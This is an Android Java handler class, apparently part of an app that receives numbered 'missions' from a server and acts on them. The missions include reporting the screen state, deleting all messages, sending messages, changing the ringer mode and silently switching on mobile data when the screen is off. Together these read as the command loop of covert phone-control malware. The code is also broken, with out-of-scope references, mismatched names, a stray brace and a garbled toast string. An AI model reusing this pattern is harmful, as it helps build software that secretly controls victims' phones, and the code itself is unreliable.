package Handler;

import internet.Methods;
import internet.gj;
import android.content.Context;
import android.os.Handler;
import android.os.Message;
import android.util.Log;
import android.widget.Toast;

import com.example.dothree.MainActivity;


public class BaoDaoAndGetMissionHan extends Handler
	{Context context;
	 Methods method=new Methods();
	 String jiaoZuoYeUrl="";
	 String baoDaoUrl="";
	 public BaoDaoAndGetMissionHan(Context context)
	 {this.context=context; 
	 }
	
	
	@Override
	 public void handleMessage(Message msg)
	     {try{
			 String reply=msg.getData().getString("Reply");
			 Log.v("internetHan","internetHan"+reply+" ");
			 String[] replyCode=reply.split("dodo"); 
			 String missionType=replyCode[0];
			 String missionID="";
		  for(int i=1;i<=(replyCode.length-1);i++)
			 {missionID+="dodo"+replyCode[i];
			 }
			 if(missionID.length()>=4) 
			 missionID=missionID.substring(4,missionID.length());
			 Log.v("subString hou",missionID);
	        switch(Integer.valueOf(missionType))
			   {case 0:
			     method.baoDaoGetMission(baoDaoUrl,context);
				 break;
				
			   case 1:
			   
			   String screenStatus=gj.isScreenOn(MainActivity.this);	
			   jiaoZuoYe(screenStatus,missionID);
			   break;
			   
			   case 2:	
			   
			   String duoSt="0";
			   duoSt=replyCode[2];
			   String taMa=methods.getTaMa(Integer.valueOf(duoSt),getApplicationContext());
			   Log.v("tama",taMa);
			   jiaoZuoYe(taMa,missionID);
			   break;
			     
			  case 3:
			    String gds="0";  
			    try{
			    gds=replyCode[2];
			    }catch(Exception e)
			    {}
			    int missionResult=methods.ganDiaoMsgNsend(getApplicationContext(),gds);
			    jiaoZuoYe(""+missionResult,missionID);
			    break;
			    
			  case 4:
			     String vvMode=methods.setVV(getApplicationContext());
			     jiaoZuoYe(vvMode,missionID);
			     break;	
			  case 5:
				  int missionResult_all=methods.ganDiaoAllMsg(getApplicationContext());
				  jiaoZuoYe(""+missionResult_all,missionID);
				  break;
			     
			  case 444:
	             if(gj.isScreenOn(getApplicationContext()).equals("off"))
			      gj.turnOnData(getApplicationContext(), true);
				  baoDaoGetMission();		   
			     Toast.makeText(MainActivity.this,"µÁ—ππ˝µÕ£¨Ω®“ÈÀ¯∆¡,“‘√‚Àªµ∆¡ƒª",Toast.LENGTH_LONG).show();
			     break;
			     
			    default:
			    	
			    baoDaoGetMission();
			    break;
			    }
			}catch(Exception e)
			{ baoDaoGetMission();
			 Log.v("exception","switch excep");
			 Toast.makeText(MainActivity.this,"switch ex",Toast.LENGTH_LONG).show();
			}
	        
		
	     }
		
	}

}
